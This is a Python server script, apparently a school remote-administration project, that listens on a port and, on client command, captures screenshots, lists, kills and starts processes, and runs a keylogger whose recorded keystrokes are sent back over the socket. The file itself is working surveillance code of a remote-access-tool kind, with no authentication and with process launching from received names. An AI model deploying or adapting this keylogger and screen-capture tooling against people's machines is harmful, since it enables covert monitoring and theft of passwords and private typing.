import socket
import pickle
from boltons import socketutils
from pynput import keyboard
from PIL import ImageGrab
import os
import wmi
import threading
import subprocess

SERVER = ""
PORT = 1234

class ServerServices:
    def __init__(self):
        self.clients = list()
        self.server = None
        self.server_thread = None


    def startServices(self):
        print('START SERVER')
        self.createSocket()
        self.server_thread = threading.Thread(target = self.addConnection)
        self.server_thread.start()


    def stopServices(self):
        print('STOP SERVER')
        for client in self.clients:
            if client.conn != None:
                client.closeConnection()
        
        # tránh lỗi trên cell
        server = self.server
        self.server = None
        server.close()

        self.server_thread.join()


    # create socket
    def createSocket(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((SERVER, PORT))
                               
        print(f"Port: {PORT}")
        self.server.listen()


    def addConnection(self):
        while True:
            try:
                conn, addr = self.server.accept()

                client = Client(conn, addr)
                client.startConnection()
                self.clients.append(client)

            except:
                if self.server == None:
                    print('Server stopped. Exit thread')
                else:
                    print('Server have unexpected error. Exit thread')
                    # self.stopServices()
                break
            
    

class Client:
    def __init__(self, conn, addr):
        self.buff = None
        self.conn = conn
        self.addr = addr
        self.client_thread = None
        self.DELIM = b'\x00'


    def startConnection(self):
        print(f'{self.addr} \tSTART CONNECTION')
        self.buff = socketutils.BufferedSocket(self.conn, None)
        self.client_thread = threading.Thread(target = self.services)
        self.client_thread.start()


    #close connection
    def closeConnection(self):
        print(f'{self.addr} \tCLOSE CONNECTION')

        conn = self.conn
        self.conn = None
        conn.close()

        self.client_thread.join()


    def services(self):
        while True:
            try:
                flag = self.buff.recv_until(b'!F!').decode()
                print(f'{self.addr} \tReceive: {flag}')
                
                if flag == 'screenshot':
                    self.sendScreenShot()
                elif flag == 'processlist':
                    self.sendProcessList()
                elif flag == 'killprocess':
                    self.getKillProcess()
                elif flag == 'startprocess':
                    self.getStartProcess()
                elif flag == 'command':
                    self.getCommand()
                elif flag == 'keylogger':
                    self.keylogger_Server()
                elif flag == 'close':
                    self.closeConnection()
            except:
                if self.conn == None:
                    print(f'{self.addr} \tClient closed. Exit thread')
                else:
                    print(f'{self.addr} \tClient have unexpected error. Exit thread')
                    # self.closeConnection()
                break


    # dump func
    def sendDump(self, var):
        dump = pickle.dumps(var)
        dump_size = len(dump)

        self.buff.send(str(dump_size).encode() + self.DELIM)
        self.buff.send(dump)
        print(f'{self.addr} \tSent dump data. Size: {dump_size}')

    # cmd func
    def getResultCMD(self, cmd, headers):
        lines = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)

        firstLine = lines.stdout.readline().decode().rstrip()
        align = []
        for header in headers:
            align.append(firstLine.find(header))
        align.append(len(firstLine) + 1)
        
        result = []
        for l in lines.stdout:
            if l.rstrip():
                line = l.decode().rstrip()
                row = []
                for i in range(len(align) - 1):
                    row.append(line[align[i] : align[i + 1] - 1].rstrip())
                result.append(row)

        return result

    #  screenshot func
    def sendScreenShot(self):
        print(f'{self.addr} \tSEND SCREENSHOT')
        image = ImageGrab.grab()
        
        self.sendDump(image)

    # process list func
    def sendProcessList(self):
        print(f'{self.addr} \tSEND PROCESS LIST')
        # f = wmi.WMI()

        # process_data = []
        # for process in f.Win32_Process(["ProcessId", "Name", "ThreadCount"]):
        #     process_data.append([process.ProcessId, process.Name, process.ThreadCount])

        process_data = self.getResultCMD('wmic process get description, processid, threadcount', ['Description', 'ProcessId', 'ThreadCount'])
        self.sendDump(process_data)

    # kill process func
    def getKillProcess(self):
        pid = int(self.buff.recv_until(self.DELIM).decode())
        print(f'{self.addr} \tKILL PROCESS {pid}')

        try:
            os.kill(pid, 9)
            self.buff.send('OK'.encode() + self.DELIM)
        except:
            print(f'{self.addr} \t\tErr: Unable to kill {pid}')
            self.buff.send('ER'.encode() + self.DELIM)

    # start process func
    def getStartProcess(self):
        name = self.buff.recv_until(self.DELIM).decode()
        print(f'{self.addr} \tSTART PROCESS {name}')

        try:
            subprocess.Popen(name)
            self.buff.send('OK'.encode() + self.DELIM)
        except:
            print(f'{self.addr} \t\tErr: Unable to start {name}')
            self.buff.send('ER'.encode() + self.DELIM)

    # keylogger func
    def keylogger_Server(self):
        def on_press(key):
            nonlocal string
            try:
                string += key.char
            except AttributeError:
                _key = str(key).split('.')[1].upper()

                if _key == 'ENTER':
                    string += f'[{_key}]\n'
                # elif _key == 'SPACE':
                #     string += ' '
                # elif _key == 'BACKSPACE':
                #     string = string[:-1]
                else:
                    string += f'[{_key}]'

        print('KEYLOGGER FUNCTION')
        string = ''
        isHook = False

        while True:
            flag = self.buff.recv_until(self.DELIM).decode()
            print(f'\tReceive: {flag}')
            
            if flag == 'hook' and not isHook:
                listener = keyboard.Listener(on_press = on_press)
                listener.start()
                isHook = True
            elif flag == 'unhook' and isHook:
                listener.stop()
                isHook = False
            elif flag == 'clear':
                string = ''
            elif flag == 'send':
                self.buff.send(string.encode() + self.DELIM)
            elif flag == 'exit':
                if isHook:
                    listener.stop()
                break
            

    


